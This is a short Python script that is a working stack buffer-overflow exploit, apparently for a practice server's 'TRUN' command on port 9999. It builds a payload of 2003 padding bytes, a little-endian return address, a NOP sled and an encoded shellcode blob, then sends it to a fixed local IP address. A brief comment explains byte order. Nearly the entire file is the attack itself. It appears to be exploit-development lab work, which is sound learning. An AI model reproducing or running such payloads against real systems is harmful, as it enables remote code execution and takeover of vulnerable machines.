#! /usr/bin/python
import sys, socket


overflow = (
"\xba\x7d\x04\xe4\xf7\xdb\xc0\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x93\xf8\x06\x02\x97\xe9\x45"
"\xed\x67\xea\x29\x67\x82\xdb\x69\x13\xc7\x4c\x5a\x57\x85\x60"
"\x11\x35\x3d\xf2\x57\x92\x32\xb3\xd2\xc4\x7d\x44\x4e\x34\x1c"
"\xc6\x8d\x69\xfe\xf7\x5d\x7c\xff\x30\x83\x8d\xad\xe9\xcf\x20"
"\x41\x9d\x9a\xf8\xea\xed\x0b\x79\x0f\xa5\x2a\xa8\x9e\xbd\x74"
"\x6a\x21\x11\x0d\x23\x39\x76\x28\xfd\xb2\x4c\xc6\xfc\x12\x9d"
"\x27\x52\x5b\x11\xda\xaa\x9c\x96\x05\xd9\xd4\xe4\xb8\xda\x23"
"\x96\x66\x6e\xb7\x30\xec\xc8\x13\xc0\x21\x8e\xd0\xce\x8e\xc4"
"\xbe\xd2\x11\x08\xb5\xef\x9a\xaf\x19\x66\xd8\x8b\xbd\x22\xba"
"\xb2\xe4\x8e\x6d\xca\xf6\x70\xd1\x6e\x7d\x9c\x06\x03\xdc\xc9"
"\xeb\x2e\xde\x09\x64\x38\xad\x3b\x2b\x92\x39\x70\xa4\x3c\xbe"
"\x77\x9f\xf9\x50\x86\x20\xfa\x79\x4d\x74\xaa\x11\x64\xf5\x21"
"\xe1\x89\x20\xe5\xb1\x25\x9b\x46\x61\x86\x4b\x2f\x6b\x09\xb3"
"\x4f\x94\xc3\xdc\xfa\x6f\x84\x22\x52\x6f\x3d\xcb\xa1\x6f\xac"
"\x57\x2f\x89\xa4\x77\x79\x02\x51\xe1\x20\xd8\xc0\xee\xfe\xa5"
"\xc3\x65\x0d\x5a\x8d\x8d\x78\x48\x7a\x7e\x37\x32\x2d\x81\xed"
"\x5a\xb1\x10\x6a\x9a\xbc\x08\x25\xcd\xe9\xff\x3c\x9b\x07\x59"
"\x97\xb9\xd5\x3f\xd0\x79\x02\xfc\xdf\x80\xc7\xb8\xfb\x92\x11"
"\x40\x40\xc6\xcd\x17\x1e\xb0\xab\xc1\xd0\x6a\x62\xbd\xba\xfa"
"\xf3\x8d\x7c\x7c\xfc\xdb\x0a\x60\x4d\xb2\x4a\x9f\x62\x52\x5b"
"\xd8\x9e\xc2\xa4\x33\x1b\xe2\x46\x91\x56\x8b\xde\x70\xdb\xd6"
"\xe0\xaf\x18\xef\x62\x45\xe1\x14\x7a\x2c\xe4\x51\x3c\xdd\x94"
"\xca\xa9\xe1\x0b\xea\xfb")


shellcode = "A"*2003 + "\xaf\x12\x50\x62" + "\x90" * 32 +overflow

"""
x86 architecture
	Little NDN format
	x86 stores low order byte in lowest address and hight order byte in highest address.
	Hence we go reverse.
	Brr..

"""


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.106',9999))

	s.send(('TRUN /.:/' + shellcode ))
	s.close()

except:
	print("Error connecting server")
	sys.exit()
